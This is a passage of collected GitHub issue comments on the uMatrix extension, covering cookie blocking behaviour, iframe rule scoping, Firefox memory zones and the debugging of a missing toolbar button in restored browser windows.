    "rkoe": "Ok, I see the point in deleting all cookies together every few minutes. So, if I even want to prevent that cookies are stored up to 2 minutes, the best way would be to use an additional Firefox-Addon (like CookieMonster).\nBut I'm not sure if the delayed-cookie-deletion is a problem together with with the \nquestion of ganego in Issue #252. Unfortunately, I don't have a setup to test this well, but I'm concerned after a quick test. But can you tell me what happens in the following case?\n1. Setup: I allow 1st-party-cookies for a website \"C\", and deny all cookies on all other sites (both 1st- and 3rd-party).\n2. I open a website A, which wants to set a 3rd-party-cookie of C, which I \"blocked\" via uMatrix.\n   This 3rd-party-C-cookie is then stored in the browser, but not sent back to site A or C. -> OK\n3. The 3rd-party-C-cookie is still stored -- either until the next 2-minute-cookie-deletion-interval or longer (if \"Delete blocked cookies\" is not enabled).\n4. Then, I open website C.\nWhat does now happen with the \"blocked\" 3rd-party-C-cookie? Is it sent to C?\nAfter a quick test (with a 3rd-party-cookie set by an IFRAME), it looks like this \"blocked 3rd-party-cookie\" -- which is still stored in the browser -- is then leaked to site C. Which would be bad.\nIf this is the case, I would (a) strongly recommend to enable \"Delete blocked cookies\" and to document this behaviour clearly or (b) recommend to use an additional cookie-blocker-addon (which is probably what I will do).\n. First: As a user, if I \"block\" a cookie, I would usually expect that it's really blocked (=not accepted) or immediately deleted after it was received. uMatix uses an other way, by accepting it but removing it from future request-headers; that's ok if the result is the same. But in this case, it's possible that a \"blocked\" cookie is sent to a site -- and that's not what I (or a normal user) understands as \"blocking\".\nTo the technical details: Yes, if I allow an iframe, it's more or less my own fault. I don't know 3rd-party-cookies in detail, but I think most 3rd-party-cookies are not set by iframes but by img (or javascript) -- and at least img from all domains are allowed by default.\nSo, if I keep the default-configuration, any website can set (but not read) 3rd-party-cookies, even if I block all cookies. Now, if I allow 1st-party-cookies on a website, for which other pages previously have set 3rd-party-cookies (although I \"blocked\" them), this website could read out all these (officially blocked) cookies.\nI don't know if this is a potential privacy problem in the real world, since I don't know how 3rd-party-cookies are usually used. Maybe it is, maybe it isn't. But in either case, it's different from what I (or a normal user) would expect.\nI don't want to request a change here; I primarily wanted to understand the behaviour, and if uMatrix really behaves this way. Now, since it looks like it does, I would like this behaviour to be documented, since unexpected, undocumented behaviour often leads to problems. So, I've added a cookie-Wiki-page: https://github.com/gorhill/uMatrix/wiki/Cookies\nFeel free to improve/modify/extend it.\nAdditionally, a small hint about this behaviour in the dashboard-text would be nice.\n. Wiki-page:\nI think the wiki page should stay in either case, since (a) there have been several issues regarding this issue (so users were confused about the behaviour) and (b) the help-text on the dashboard is hidden below the \"Delete blocked cookies\"-help-button, and so probably isn't read by most users; and it's only available after having installed uMatrix.\nAnd uMatrix does block cookies in a different way than most other cookie-blockers. So, when someone switches from some other cookie-blocker to uMatrix, he probably assumes that uMatrix blocks cookies in a similar way, and is probably puzzled when he notices that that's not the case (as I and at least the ones who opened the other cookie-issues were).\nEspecially for a privacy-/security-related addon, I think it's important that the users understand what they are doing and what the addon is doing.\nSo, I think a page which clearly explains the behaviour of uMatrix (in the documentation, which is simple to find and can be read without/before installing uMatrix) could help, reduce the confusion and make more users understand the behaviour. Having both my explaination and your dashboard-help-text on the wiki page is good in my opinion, since being able to read the explaination in two different wordings should make it easier to understand.\nBut of course, the text/wording on the wiki-page could be improved. I've tried to improve it, and hope you are more happy with the new version.\n\nProblem of leaking cookies:\nI think it can be a problem when a site can read these cookies, since this site could then correlate all visits (which it couldn't as easily without cookies). Example:\n- I've blocked all cookies, except 1st-party-cookies for socialnetwork.example.\n- I visit somepage.example, which includes an image from socialnetwork.example.\n- Then, I visit otherpage.example, which also includes an image from socialnetwork.example.\n- Then, I visit some more pages. socialnetwork.example sets a 3rd-party-cookie on every page (which is blocked by uMatrix).\n- Now, I go to socialnetwork.example, and socialnetwork.example can now read all the \"blocked\" 3rd-party-cookies from somepage, otherpage etc., correlate all these visits (since it now knows that all visits came from the same browser) and so track me.\nOf course, socialnetwork.example could also try to track me by other means (e.g. IP-address or etags of the included image), but that doesn't mean that the possibility to be tracked by cookies isn't a problem.\nI don't know if anyone really uses 3rd-party-cookies this way, and I even don't know if there is any good reason at all for 3rd-party-cookies. This is why I have disabled them globally in my browser-preferences, and think that that's the best solution to this potential problem.\n. Thanks! =). My rules in short are: Block all cookies (and nearly all scripts). 3rd-party cookies are forbidden.\nI could also create a cut-down-version with minimal rules (and then post the whole rules or even send you the firefox-profile), if this would be helpful.\nRules: mainly\n* * * block\n* * other block\n* * script block\n* 1st-party css allow\n* 1st-party frame allow\n* 1st-party image allow\nplus several cross-site-css/-image entries (\"... ... css allow\", \"... ... image allow\")\n3rd-party cookies: \"Accept third-party cookies: Never\"\n. ",
    "leafcutterant": "I have to thank @rkoe for going into such painstaking details (it helped me understand the situation), and express that I see it the same way.\nI was looking into uMatrix because the dynamic blocking GUI is simply genius, its efficiency beats every other add-on, and I planned to switch over from uBlock Origin. Out of the cookie-blocking (actual blocking) choices, I found Cookie Monster to be the best but even in its case, the handling is very tedious and many times it's impossible to unbreak a site without switching off the add-on. Therefore, a matrix-like cookie blocking interface would be very beneficial.\nI believe that there is a real demand for actual blocking (=not allowing cookies to be placed) and encourage you to consider implementing it. I also understand that not allowing a cookie to be placed deprives the used from inspecting its content and requests by the site to read it, but probably this could be settled with a switch in the Settings (\"Prevent blocked sites from placing cookies\", unchecked by default).\n. ",
    "the8472": "\nIt makes those sites easier to use across websites too (for example i can allow youtube to access ytimg and googlevideos then on any other site i only need to allow access to youtube to get all those settings).\n\nIt may make sense to have different rules when a site is a top level site and when it's embedded.\nFor example you might want to allow cookies and various google domains for necessary for login on youtube.com but not allow those when viewing embedded youtube videos on another site because it doesn't add value there.\nOr similar, when you want to allow google recaptcha at a particular site (which has a ton of google-related dependencies) doesn't mean you want to apply the \"usual\" rules you would apply when google.com is your top frame.\n. The specific <iframe> case could be represented in the matrix by a bubble folding out from the rule allowing the frame embed itself.\nI.e. you allow the frame embed. And then inside the frame you allow certain requests without allowing them in the top window context.\n\nThis would preserve the table structure of the matrix while signalling that some rules are scoped to specific subframe.\nBy defining such a rule in the * context one could have a set of rules that could be used on any site but you would still have to allow the frame on that specific site.\n. If the <iframe> has the appropriate referrer and sandbox attributes set it might make even more sense to give them special treatment since they essentially act like a separate tab that does not leak cross-origin information to the embedded content.\nThat way one could allow safe 3rd-party content embedding while still blocking everything else.\n. 1. go to about:memory\n2. click measure\n3. when measurement is done unfold explicit -> js-non-window ->  zones\n4. look for the zone that contains a compartment called outOfProcessTabChildGlobal (e10s, child process) or inProcessTabChildGlobal (non-e10s).\nThat's the global zone where all the chrome/browser.xul/addon/framescript stuff lives by default.\nThe tab-specific zones are listed under explicit -> window-objects\n. > If I understand what you are saying, zones are separate, independent memory arenas, and thus running a GC operation in one means the GC code will not stumble onto items from other arenas (zones)?\nyes, ideally it will have the following effects\na) the window and the sandbox can be discarded together, i.e. without having to GC the system zone\nb) GCs in the system zone are cheaper because they don't have to touch the sandbox\nc) GCs in the sandbox are cheaper because they don't have to touch the system zone\nIn practice those benefits may not be fully realized because there can be references crossing zone boundaries, keeping objects alive longer than necessary.\nThat can be further improved by either using weak references for anything pointing into the sandbox or by nuking the sandbox if you're holding onto a reference to it somewhere.\nI see that you're registering message manager callbacks and have them point into the sandbox (I think?). Maybe using weak listeners would be appropriate there if the callbacks are kept alive by a field in the sandbox anyway.\nBut that's a second step, separating the zones might already provide some good improvement.\n. this fix introduces sync messages in e10s, which are detrimental to performance. \nThe old code using loadinfo should be fine if you use feature-detection to check if loadInfo.externalContentPolicyType is present instead of .contentPolicyType\nsee https://bugzilla.mozilla.org/show_bug.cgi?id=1182571\n. I think something like loadInfo.externalContentPolicyType !== undefined ? loadInfo.externalContentPolicyType :  loadInfo.contentPolicyType should do the job in all current firefox versions. So the frameModule can just use the same check as before (version < 35) and never run in modern browsers.\nBasically restoring the old behavior and just probing under which name the property is available.\n. > Let's take youtube videos embedded on so many pages. Its very frustrating experience to add the rules for each site containing videos like youtube\nI think that's not a problem specific to referrers. It's a problem of nesting.\nEssentially a youtube-embed on a 3rd party site is one atomic item that you want to allow. With all the sub-items not being related to the embedding site but to the embedded site due to CORS-isolation.\nIn other words, there are two different concerns\na) is site A allowed to make a specific type cross-origin request to site B (e.g. embed a youtube iframe)\nb) if a site B resource is cross-origin embeded in any site then allow it to load X, Y and Z.\nNote that an embed is distinct from a top-level load. E.g. if you load youtube on the top level you may want to let it access google.com and send cookies so you get your youtube-login. But when you embed it on a 3rd party site you only want to allow the minimal amount of requests necessary to make it work.\nI outlined similar thoughts in #318\n. Or to put it even more strongly, the permissions granted currently are to coarse-grained.\nLet's expand the scenario:\n- nytimes.com links to a youtube.com video\n- nytimes also embeds google ads\n- let's hypothetically assume the youtube.com video is some sort of sponsored thing that only works if youtube can play ads, thus has a dependency on google ads\n- youtube.com also has a depdendency on googlevideos.com\nwhat the user wants to allow:\nnytimes.com -> youtube.com -> googlevideos.com\nnytimes.com -> youtube.com -> ad.doubleclick.net [we're not happy about this one, but at least we strip cookies here]\nwhat the user does not want to allow:\nnytimes.com -> ad.doubleclick.net\nnytimes.com -> googlevideos.com\nyoutube.com -> nytimes.com\nor any other combinations that might possible by the current rules.\nIdeally this would be represented as a path along a directed graph. But I think we can get away with specifying specific edges. I already suggested the embedded submatrix in #318, another option would be adding new scopes specifically for embedded content. That way one could allow the embed with one rule in the top level scope and just manage all the dependent requests in the subscope, once for all sites that embed that subscope.\n\n. @seafox, well, we already have at least 2 matrices anyway, through the scopes. My suggest is either adding more or embedding one matrix into a larger matrix as already suggest in #318:\n\nLike I said above. ideally we would describe a graph, but in light of usability and the \"matrix\" branding I'm considering some reductions. I think the UI issues are definitely solvable.\n. Offering some link to jump from the embedding-point to a new matrix would also be an option.\nI think the UI-aspect can be solved, how exactly may be down to individual preferences, I'm just trying to demonstrate that it is possible.\n. yes\n. Your link is broken, but I tested with https://github.com/gorhill/uMatrix/releases/tag/0.9.3.2b0\nThe exception still occurs, inspecting frameModule.jsm with the debugger this.modernFirefox is false in the content policy.\n. works. no content policy calls and requests are properly categorized.\n. On firefox, one could set the LOAD_ANONYMOUS flag on the channel. It removes cookies, authentication headers, referrers and Origin headers (for CORS requests).\nThat may break more sites than just blocked cookies though, so it probably has to be a separate option.\n. Similar issue: https://github.com/gorhill/uMatrix/issues/393#issuecomment-156547112\nIt's basically a subproblem of the more general case that umatrix does not represent the hierarchy of loads well.\ntop level site -> frame  -> script -> xhr\ntop level site -> xhr\nThose xhrs could go to to the same domain even though you would only want to allow the top level one but not the one in the frame or vice versa.\nFor youtube embeds you would want to allow top-level -> frame and frame -> googlevideo.com but not top-level -> googlevideo.com\n. This probably refers to weak references simply not being aware of any internal lifecycle that an object might have. I.e. they don't get nulled magically just because you close/invalidate/shutdown some object that supports such things.\nWhether that's actually a problem depends on downstream consumers of the object returned from the weak reference. It's no different from fishing some old dom node that has long been detached or a channel that has been closed out of some javascript variable.\n. Ah, I looked at the code. In addition to the weakmap/ref stuff this check could be replaced with something else that doesn't need the index operation.\nChecking whether the <browser> is still attached to the DOM might be the most efficient way.\nAlternatively there is browser.ownerDocument.defaultView.top.gBrowser.getTabForBrowser(browser), but I don't know whether that's any more efficient, I think it might also iterate internally. Edit: it uses a weakmap internally, so it should be a fast way to access it.\n. Looks good. Haven't seen any more hangs on  0.9.3.5rc1\n. ",
    "c-mart": "Has this situation changed in the past year? I would really like to switch from NoScript to uMatrix!\nUnfortunately, uMatrix prevents sites from gracefully degrading to the non-JS version using <noscript> tags, which requires us to allow JS in more places than we would with NoScript. The only upshot is not seeing the \"this site requires JavaScript to function\" warnings. :)\nIt appears that there was originally an attempt to render <noscript> tags, which was removed a year ago when it was found to break Google results in Firefox.\nHow is NoScript doing this in a way that uMatrix cannot?\n. ",
    "pmaziere": "Just an idea thrown without any knowledge of the uMatrix internals: if there is a way to check that scripts have been intercepted by uMatrix for a given page, why not simply grab the inner html of this page noscript tags, insert it before the noscript tag and then delete the noscript tag ?\n. 'ignore' like 'do not include them in the DOM' so that there is no way to have access to their content ?\nSo the only solution would be for uMatrix to re-download the raw HTML of the page, locate and extract the noscript tag content to reinject it in the at the right place in the DOM\u2026 \n. ",
    "baptx": "@grumpygeek I did not hear this story :D Do you have a link to share?. For the cookies, it is no convenient to disable them via the browser settings (we have to do 6 clicks instead of 2 via the addon interface) and the preferences will be reset when we clear all the browser history. Cookies should be disabled on a domain basis like JavaScript through the addon interface.\nFor the latest Firefox, NoScript addon can disable JavaScript and support <noscript> HTML tags so it is using a different API?\nI think it will be possible to really disable cookies when contentSettings API will be supported: https://bugzilla.mozilla.org/show_bug.cgi?id=1291841\nThe issue I created could be reopened and renamed to block cookies correctly in a future version.\nEventually, there could be an option to have the current behaviour that websites don't know if JavaScript or cookies are disabled, which could prevent censorship in some cases if we don't want to enable them.. ",
    "yupi2": "@vdcbb For Reddit - https://ssl.reddit.com/prefs/security/\nYour answer is to use HTTPS Everywhere (and others) since uMatrix doesn't provide that.\n. ",
    "muellert": "I don't know where to adjust this, but I can't click on some ads on taobao.com. The result is this error message, with\nhttps://click.simba.taobao.com/cc_im?p=%C...\nI would like to not completely disable ublock on this site, however. I have Firefox 46.0.1 on Linux.\n. ",
    "rubypanther": "Pretty lame to see this closed as \"we don't make mistakes\" when there is a clear problem with being able to conveniently turn off blocking under user control. Users don't care how you classify it, if you see it as a bug, misfeature, feature request, etc. Different developers have different opinions on that. But clearly it is something that is problematic for users, because there is no button like \"I understand, continue anyways.\". ",
    "toshiya44": "Doesn't sound like you actually use uMatrix @rubypanther \nFirst line in README.md is Definitely for advanced users.. If you're using uMatrix you're expected to be able to unbreak websites on your own.. It's working on my end. \n\nuMatrix 0.9.9b4, Firefox Nightly 55, Win8\n. Yeah, it doesn't seem to be working on Chrome (I guess uBO extra helps uBO only). . See this comment https://github.com/gorhill/uMatrix/issues/685#issuecomment-268620190 , it explains how to set rules for global scope. . ",
    "mnlsrv": "Apparently fixed with: https://github.com/gorhill/uMatrix/issues/289\n. ",
    "dllud": "I'm using Firefox. Though the keyboard shortcut would not solve my issue. I would still have to move my mouse to the matrix in order to operate it. Or are there any special keyboard shortcuts for this?\n. Thanks for the info.\n\n\nCode was too complicated for what I consider a non-essential feature, compromising uMatrix's stability (my main goal).\nThe code relied in part on behavior specific to Chromium.\nAfter using uBlock for weeks, months, I now favor having the user reload on his own when he decides so. I like it this way personally.\nThe matrix can be stickied in the logger, rendering auto-reload irrelevant.\nThe auto-reload code was buggy anyways, it did not always accomplish its purpose (because point 1. and 2. above)\n\n\nCould you please elaborate on point 3? When using uBlock I had the exact opposite experience, I missed the auto-reload. For uMatrix I see little advantage on forcing the user to reload manually. The most common use case is to open the matrix, enable some domains and reload. Closing the matrix without reloading is a rare event (I've never done it).\nBut you could always add this as optional, though it seems most users would benefit from it. Were there any scenarios where auto-reload hindered usability?\nIf we consider Firefox alone points 1, 2 and 5 shouldn't be an issue. You can go to NoScript and cherry-pick their code which seems stable (both projects are GPL). \nPoint 4 seems irrelevant here. If a user opens the logger she is certainly not looking for a quick use case, thus no problem on not auto-reloading. \n. ",
    "tarbucktransom": "Seconding this. Specifically, I want there to be an option (disabled by default) for mousing over the uMatrix icon to open the matrix, and then reload the page on mouseout only if there were any changes made. With the option enabled, clicking on the uMatrix icon would leave it on until the icon were clicked again regardless of mouseout or switching windows.\n. ",
    "Greed1": "Chromium  47.0.2500.0\nFor  Google Chrome it's the version 45.0.2454.85 \n. On Clubic.com the same issue occurs with livefyre. If the referrer spoofing is enabled the comments won't appear. Everything was fine with 0.9.2.1\nexample: http://www.clubic.com/mag/culture/actualite-783092-quiz-connaissez-retour-futur.html\n. ",
    "iamzam": "Also mentioned in Chrome 45.0.2454.85 release notes:\n\"[$3000][510802] Medium CVE-2015-1297: Permission scoping error in WebRequest. Credit to Alexander Kashev\"\nhttp://googlechromereleases.blogspot.com/2015/09/stable-channel-update.html\n. what happens if you turn webm off in about:config (search for webm)?  Do you get the mp4 file then?\n. ",
    "schrekia": "I think there should be a specific permission type for reading other extensions' requests. This change just leaves all other extensions and their behind-the-scene requests out of uo's control, making it half-crippled. Someone should open a request to chromium developers to add this specific extension permission. I get the security problem here, but with an explicit user permission, it should be left to the users' choice to allow specific extensions to read/block/etc. others' requests.\n. ",
    "ppawel": "Yes, uMatrix in Opera is at 0.9.1.0 while in Chrome 0.9.3.1...\nhttps://addons.opera.com/en-gb/extensions/details/umatrix/\n. ",
    "jayarmstrong": "excellent. Thank you for the explanation and the great addon.\n. ",
    "PatchyKnowly": "Ah, thanks for letting me know. I'll go see what Pale Moon devs say then.\n. ",
    "Vexercizer": "Nevermind.\n. ",
    "jrynd": "Removed umatrix and deleted the applications directory. Redownloaded Chromesetup.exe and ran it. No umatrix obvious.y Redownloaded umatrix and it's been hung on \"Adding to Chrome...\" for over an hour.\n. From https://www.google.com/chrome/\n. ",
    "paleyellowmoon": "Thanks for following up, Raymond. I apologize for not updating this issue in a more timely manner.\nWhen Chrome+uMatrix pegs my CPU at 100%, I practically can't do anything else, including opening the dev console. The machine becomes very sluggish and unresponsive to normal keyboard or mouse input.\nWhile you're right that I could provide more useful information if I were able to profile uMatrix in the event of a slow down, I'm fairly certain that I've isolated the cause within the crude limits of what I am able to do.\nI already mentioned that I removed uMatrix and installed Adblock Plus. I've been using this configuration for the past 5 days, and I haven't encountered a single instance of my machine slowing down.\nThis evening I uninstalled ABP and re-installed uMatrix. Within 15 minutes of using Chrome to browse the CNN website and stream the American Republican presidential debates, my computer once again hit 100% CPU and slowed down to an absolute crawl.\nI shut down the machine, restarted it, uninstalled uMatrix, reinstalled ABP, and went back to streaming the debate. The machine worked fine for the remaining 2.5 hours of the debate, and is still working fine.\nI certainly wish I could gather the data that you've described when my machine slows down with uMatrix running, but so far, I'm stymied by the slow machine.\n. ",
    "dhiltonp": "Ah, thanks :)\nDavid\nOn Sat, Sep 12, 2015 at 9:44 PM, hotdogman notifications@github.com wrote:\n\nhttps://github.com/gorhill/uMatrix/wiki/Very-bare-walkthrough-for-first-time-users\nYou're looking for the global scope (*).\n\u2014\nReply to this email directly or view it on GitHub\nhttps://github.com/gorhill/uMatrix/issues/352#issuecomment-139842732.\n. \n",
    "zummuz": "@Krysisx try HeaderControlRevived it can change referrer, user agent and requested language for all sites and create rules for particular sites. Its for firefox. Or look for extensions which change http headers.\n. @Krysisx https://bitbucket.org/Torvin/headercontrolrevived/src (https://bitbucket.org/Torvin/headercontrolrevived/issues?status=new&status=open - link from firefox AMO), looks like this addon is open source.\n. I think language preferences can't be very helpful in user tracking as long as you don't request rare African dialect or something like that. Insecure things like cookies, caches, referrer, UA, etc uMatrix can handle, so I doubt that gorhill would approve this feature but who knows.\nIt's better to discuss suggestions in the subreddits and keep github for problems/issues:\nhttps://www.reddit.com/r/ublockorigin\nhttps://www.reddit.com/r/uMatrix\n. @Symbai provide some details that gorhill would be able to reproduce the issue:\nWhat browser do you use, OS? \nWhat version of uMatrix, because stable for firefox is 0.9.2.1 and for chromium-based is 0.9.2.0 and there is dev version?\nWhat settings in the privacy tab in the settings of the extension are checked?\nVideos don't play from home page of youtube or when you turn on youtube's playlist, etc?\nupdate:sorry I haven't noticed you provided that you use the latest beta of uMatrix.\n. @Symbai @danieljl I just tried on firefox 34.0.5 (portable version), uMatrix 0.9.2.2b4, windows 7, \"Spoof HTTP referrer string of third-party requests\" is checked, html5 - youtube works fine.\nDo you allow scripts on the site? Maybe your rules were purged on extension update? Do videos work when referrer spoofing is unchecked?\nCheck this lines in \"My rules\" tab:\nyoutube.com googlevideo.com other allow\nyoutube.com googlevideo.com xhr allow\nyoutube.com ytimg.com script allow\n. ",
    "2glops": "Krysisx,\nThere is also Modify Headers:\nhttp://www.garethhunt.com/modifyheaders/\n. ",
    "DjogaRo": "Testing yielded two significant aspects: Pinned Tabs and restoring a window through History\nDid some testing with a new Pale Moon profile and uMatrix only.\nI didn't change uMatrix' default settings.\nI changed PMs Home Page to \"google.com/ncr\", which resolves to \"https://www.google.com/?gws_rd=ssl\". I only used this page in every tab during testing.\nAnd I changed the PM start up setting to restore windows and tabs from last time.\nHaving 2 windows with 1 tab each, exiting and starting PM again yielded no problem, i.e. both windows kept the uMatrix icon.\nBut the problem can be reproduced having 2 tabs in the first window with the first one being pinned. (Having 2 tabs in first window, none pinned -> no problem)\nThen I tried to reproduce the problem when closing a window and restoring it through History -> Recently Closed Windows ...\nStrangely enough that procedure has the opposite effect. It doesn't produce the problem, it repairs it. So if I yielded the problem through exit PM, start PM, and then closed the window with the icon missing to restore it through history, the restored window got the icon. That \"healing effect\" even lasts through the next exit-start-PM iteration. So the latter has to be done 2 times to have a problem again.\nNext thing on my list: doing the same with FF. Till then ...\n. Tried the same testing with Firefox 40.0.3.\nCould not reproduce.\n. Same test, Firefox 24.8.1esr\nReproducible.\nBasically the same as with Pale Moon, but no need for pinned tabs, thus easier to reproduce. Although, with FF the problem was a bit fluctuating.\nFirst it was that after restoring a problematic window through History -> Recently Closed Windows ... it often took 3 instead of 2 iterations of exiting and starting FF to have an icon missing again. Then although uMatrix' default settings allow 1p cookies, when starting FF the restored tabs got redirected to google.de. And after that episode the history restore had lost its lasting effect, i.e. now it constantly took only one exit-start-FF to have a window missing the icon.\nAll very strange.\n. For a few starts of PM now my problems with uMatrix and uBlock0 seem to be gone (including the mentioned forgetfulness). My current version of PM is 25.7.2 (x64), but i can't tell if the problems' end coincided with a PM-update. uMatrix still shows version number 0.9.2.1.\nThough those problems don't bother me anymore, I confirmed that my last post is still valid. Well, except for the PM reference.\n. Uhm, that might have been a bit premature. PM just got updated to 25.7.3 and I got both problems back. I don't know, if this is important, but i had icons missing again with the asked-for restart after update. Then I exited manually and started PM up again. Still, the problems are back (including uBlock0's forgetfulness).\n. Thanks for your response.\nSo I just made a new profile and installed uBlock0 from the link you provided and went through my test routine.\nWhatever you did definetly has an effect. Now when I cycle through (Main Menu -> \"Exit\", Start PM) the toolbar button is missing every second time. When I mess around like changing which window's Main Menu I use to exit, it sometimes needs a few iterations to fall back into this pattern. But apart from that the pattern is stable. So, not statistically every second time, but literally.\nStrange, but a change. :)\n. Same test, Firefox 24.8.1esr\nSame same, but different. Here it's not that strict, alternating pattern. It seems to be a random series of the icon being there, not being there.\n. Correction:\nFurther playing around yielded the missing of the button in all but one window on auto-session-restore is random in PM, too.\nThat also goes for the test profiles with uMatrix 0.9.2.1 or uBlock0 1.2.1 respectively. So I guess it has always been random for me and presented a pattern by chance or some things do have kind of an influence or changes to PM might have caused a pattern shift. \nHowever, you indirectly led me to https://github.com/gorhill/uBlock/issues/833. And, you saying\n\nI added another chunk of code to further defer adding the toolbar icon at a later time if uBlock can't find the required component when a new window is created.\n\nmade something else catch my eye.\nold := in PM with uBlock0 1.2.1\nnew := in PM with uBlock0 1.3.0rc4\nThe old behaviour when starting PM, in every restored window - in which the button gets to be - said button starts out being empty bearing no picture yet and only having little extent, as if maybe caused by some set padding. Then the picture appears; the button is complete.\nThe new behaviour is, the button starts out complete and then continue with the old behaviour from its beginning, i.e. being empty for a fracture of a second.\nAnd that's actually all the difference I can make out so far.\nOn opening new windows I cannot make out such thing happening (maybe just faster?). And I don't see it happening this way in FF24.\nI also read the PM-Forum thread linked in uBlock issue 833. Others report to have the button missing in their only window and in new windows, which never was the case for me. The first restored window on PM start always has it. So does every new window I open.\nIn my standard profile with my standard session I seemingly always get the button in only the first window. But that's loaded with some more extensions plus the first window has 83 tabs - 27 of them pinned - and the second has another 20 tabs. Some of that might shift the odds.\n. Update:\nThe button placing code seems not to be a problem here. After I found out, that one can use unpacked add-ons and got the browser to show me some logging I put in, I observe that addLegacyToolbarButton(...) gets called as many times as I get windows bearing the button, i.e.\nWhenever I got the button missing in a window, it is because addLegacyToolbarButton(...) hasn't been executed for that window.\nIs that the point where I change this issue's title? If so, to what?\n. Thanks. Did the testing and unfortunately could still reproduce.\nI'll pave that thing with console.log() statements and poke around later this day.\nI haven't mentioned this here, yet, since I was going to make it a separat issue, but in the new context...\nWhen uBlock0 is missing its button, it also misses to use \"My Filters\". When I open the dashboard they are listed, but only after adding sth. and applying changes, the list takes effect again.\n. Right now I'm at work, but for later it would be great to know the entry points already - for when their is a new browser instance and for when their is a new window. So, if you can provide them from the top of your head, it would help me a lot.\n. Yes|No, I'm testing using uBlock Origin to be exact. :)\nBoth Buttons (uBlock0, uMatrix) are always present together or missing together. Well since there's an exception to everything, This morning in my second window (of two) uBlock's was there, uMatrix' Button was not. So, I presume, it doesn't matter which of them I use, does it.?\nAnd thanks for the info.\n(still not back home)\n. In case of a missing button onWindowLoad() did not get executed for that window.\nWhat next?\n. Correct, uBO 1.3.0.\nvAPI.tabs.getWindows produces exactly one window, that would be why the first to be restored window always gets the button. But windowWatcher.observe does not always get executed for the remaining ones. (I put the logging at this function's very beginning.)\nWould be interesting to see what happens, when first the windowWatcher gets registered and then the intial loop over existing windows gets done. I'll try that tomorrow. Just to rule out, that the remaining windows are produced between said loop and the registration.\n. Just tried the latter. Makes no difference.\n. I made it test for (true || !win.closed), but still only one windows produced. In cases of error and cases of success (regarding button's presence). I really gotta get some sleep. Til then.\n. Not for that. That add-on itself is a huge chunk of work. What's investigating a problem, that bugs me, compared to building that thing in the first place. :) As soon as I knew, how I could investigate, there was no reason not to.\nYeah, I'm going to make a thread at PM's forums later. Maybe the API will get an update or there might be a well trodden way to handle the given behavior. We'll see.\n. I was just about to report in the PM forum, when I recognized, that getting the initial windows utilizes another service than the registering an observer. Unification fixes the problem. Now my second window sometimes gets handled in the initial loop in start() and sometimes through an event by the observer. I'd yet have to see it handled in both codepathes during one startup.\nJust replace\njavascript\nvAPI.tabs.getWindows = function() {\n    var winumerator = Services.wm.getEnumerator(this.chromeWindowType);\n    var windows = [];\nwith\njavascript\nvAPI.tabs.getWindows = function() {\n    var winumerator = Services.ww.getWindowEnumerator(this.chromeWindowType);\n    var windows = [];\nIn an example utilizing wm a listener for the window's load event was registered with the window whenever there's a new window opened. I have a feeling, that way all those delays may be unneeded. I'll investigate.\nThe example is the chosen answer in:\nhttp://stackoverflow.com/questions/29178158/in-a-firefox-restartless-add-on-how-do-i-run-code-when-a-new-window-opens-list\nAt PM forum I also asked, whether WindowWatcher or WindowMediator was to be preferred - respecting that the code is meant for all supported FF-lings. The thread is:\nhttp://forum.palemoon.org/viewtopic.php?f=16&t=9893\n(I also asked to move the thread, and the way the url looks it may change by that).\n. Let me guess. Occasionally having two entries in the second window's context menu?\nWhen the second window gets handled by the initial loop in start and there's a delay because ( wintype !== 'navigator:browser' ) evaluates to true, it somehow happens, that it gets two CM entries.\nI have yet to understand the magic behind those entries. With the same delays the first window still ends up with one entry. If I comment out the entry's registration in attachToTabBrowser, the first window still gets it - even the second window does sometimes.\nSearching in files for \"contextMenu.register\" finds me no other call.\n. It's not here anymore. I've got to wait for the FF-release of 1.3.2b2, I guess.\n. I can't see an xpi there. so I copied 1.3.0 to a new profile and replaced vapi-background.js with the on from 1.3.2b2.\nWith that the issue still occurs from time to time.\nAs soon as I get my hands on the new xpi or you tell me the mix I did suffices, I'll look into it.\n. I'm on it\n. Nevermind.\nThe second window sometimes is neither handled in the initial loop nor does onOpenWindow get called.\nAnd still it gets a context menu entry. That's way above me.\nIs WindowMediator to be prefered over WindowWatcher? Since using the other one, initial loop and event handling complemented each other quite good.\n. Well, I had already tried (with WW) making the observer add an event listener to the new window - which is to wait for a \"load\" event. The listener function I had defined within observe(...), which I couldn't figure out to do in start(), too. That way onWindowLoad(...) when called by the observer never showed delays happening in the attach... functions.\nSo now I added\njavascript\n    var getOnLoadListener = function(win) {\n        function onLoadListener() {\n            console.log(\"__LL: Got called for a window done loading!\");\n            win.removeEventListener(\"load\",onLoadListener);\n            // Only add UI changes if this is a browser window\n            if (win.document.documentElement.getAttribute(\"windowtype\") === \"navigator:browser\") {\n                console.log(\"__LL: Event domwindowopened\");\n                onWindowLoad(win);\n            } else\n                console.log(\"__LL: windowtype ain't navigator:browser!\");\n        }\n        return onLoadListener;\n    }\nand replaced onWindowLoad(win); with win.addEventListener(\"load\", getOnLoadListener(win)); so that I can use that in start, too. Having two context menu entries in window 2 only happened when handled in start and later experiencing delays. This should fix it plus make the delay code obsolete.\nBut now. I never see the initial loop iterated twice. Instead, I get\n[20:31:40.211] this._cps2 is undefined @ chrome://browser/content/browser.js:1614\n[20:31:40.405] this._lastStatus is null @ chrome://browser/content/browser.js:14018\n[20:31:40.406] this._cps2 is undefined @ chrome://browser/content/browser.js:1614\n[20:31:40.407] this._lastStatus is null @ chrome://browser/content/browser.js:14018\nor one handled through the loop and one through the observer and then all goes fine.\nI don't understand how these errors in browser.js come about, but I've got a feeling, I have to look for them using the unchanged 1.3.2b2 again.\n. I'll have a look.\nBy the way, I've reverted 1.3.2b2 back to before my additions. Those errors in browser.js always happen - when buttonwise all is fine and when not.\n. Still missing the button in the 2nd window sometimes.\nLooking at the code changes I don't get which issue you were addressing.\n. I'm get lost, too. :)\nNo, mixing those two doesn't work here, cause using\njavascript\nvAPI.tabs.getWindows = function() {\n    var winumerator = Services.wm.getEnumerator(this.chromeWindowType);\nfor startup never yields more than one window, for whatever reason. Using WindowWatcher for that, too, gives also those windows during startup, which won't cause a notification to a registered observer later. So only using WW, restored session windows are early enough generated to get them initially or certainly handled later.\nIn 1.3.2b2 you tried, if both places utilizing WM would also fit together, but it didn't. At least not on my machine.\nAnd me getting lost shows in that I had forgotten to replace wm when getting the enumerator. (Update: Here I'm referring to my own attempt, I reported on, an hour ago or so) Fixed this. Now all is fine (using onLoadListener), except for that sometimes now the first window gets no button. So I managed to invert the problem. :)\nAnd I noticed there are some more places utilizing either Services.wm or Services.ww. And I have no idea, where this mixture doesn't matter and where it might.\n. Regarding my own attempt, I 